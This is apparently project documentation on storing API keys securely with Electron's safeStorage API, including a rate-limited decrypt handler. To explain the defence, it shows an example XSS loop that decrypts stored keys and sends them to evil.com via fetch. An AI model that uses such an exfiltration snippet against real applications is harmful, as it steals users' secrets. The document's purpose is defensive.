# Electron safeStorage

## What Is safeStorage?

Electron's `safeStorage` API encrypts strings using the **operating system's keychain**:

| OS | Backend |
|----|---------|
| macOS | Keychain |
| Windows | DPAPI (Data Protection API) |
| Linux | libsecret (GNOME Keyring / KDE Wallet) |

The encryption key is managed by the OS and tied to the user account. Even if an attacker reads the app's data files, the encrypted values are useless without the OS-level key.

```javascript
const { safeStorage } = require('electron');

// Encrypt (returns Buffer)
const encrypted = safeStorage.encryptString("sk-abc123...");

// Decrypt (returns string)
const decrypted = safeStorage.decryptString(encrypted);
```

## When to Use safeStorage

| Data | Storage | Why |
|------|---------|-----|
| API keys (OpenAI, Anthropic) | ✅ safeStorage | High-value secrets, protect at rest |
| OAuth tokens | localStorage | Short-lived, rotated frequently |
| User preferences | localStorage | Non-sensitive settings |
| Client secrets | ❌ Never on client | Must stay on backend (Key Vault) |

## DJ.ai Implementation

DJ.ai wraps safeStorage in a utility module with IPC handlers:

| File | Role |
|------|------|
| `electron-app/src/utils/secretStorage.ts` | Frontend API — `setSecret()`, `getSecret()`, `deleteSecret()` |
| `electron-app/electron/preload.cjs` | Exposes `safeStorage.encrypt()` and `safeStorage.decrypt()` via contextBridge |
| `electron-app/electron/main.cjs` | IPC handlers with **rate-limited decrypt** |

### Rate-Limited Decrypt

**Why rate-limit decrypt?** If an XSS vulnerability is exploited, the attacker's script runs in the renderer. Without rate limiting, it could rapidly decrypt all stored API keys:

```javascript
// ❌ Without rate limiting — XSS can exfiltrate all keys instantly
for (const key of allKeys) {
  const secret = await window.electron.safeStorage.decrypt(key);
  fetch('https://evil.com/steal?key=' + secret);
}
```

DJ.ai limits decrypt operations to **10 calls per 60 seconds**:

```javascript
// electron-app/electron/main.cjs — Rate limiting
const DECRYPT_LIMIT = 10;      // Max calls
const DECRYPT_WINDOW = 60000;  // Per 60 seconds
let decryptCalls = [];

ipcMain.handle('safe-storage-decrypt', (event, data) => {
  const now = Date.now();
  decryptCalls = decryptCalls.filter(t => now - t < DECRYPT_WINDOW);
  if (decryptCalls.length >= DECRYPT_LIMIT) {
    throw new Error('Rate limit exceeded');
  }
  decryptCalls.push(now);
  return safeStorage.decryptString(Buffer.from(data));
});
```

### Fallback Behavior

| Environment | Behavior |
|-------------|----------|
| Packaged Electron app | ✅ Uses OS keychain via safeStorage |
| Development (Vite browser) | ⚠️ Falls back to plaintext localStorage (acceptable for dev) |
| Packaged without safeStorage | ❌ Throws error (don't degrade silently in production) |

## Key Takeaways

- Use `safeStorage` for high-value secrets (API keys) — the OS keychain protects them at rest
- **Rate-limit decrypt operations** — limits the damage from XSS
- Don't use safeStorage for frequently-accessed tokens (OAuth) — the decrypt overhead isn't worth it
- Provide a dev-mode fallback (plaintext) but **never** in production builds
- Client secrets (OAuth) must never be stored on the client, even encrypted

## References

- [Electron — safeStorage API](https://www.electronjs.org/docs/latest/api/safe-storage)
- [OWASP — Sensitive Data Storage](https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage)
- [Windows DPAPI](https://learn.microsoft.com/en-us/windows/win32/seccrypto/data-protection)
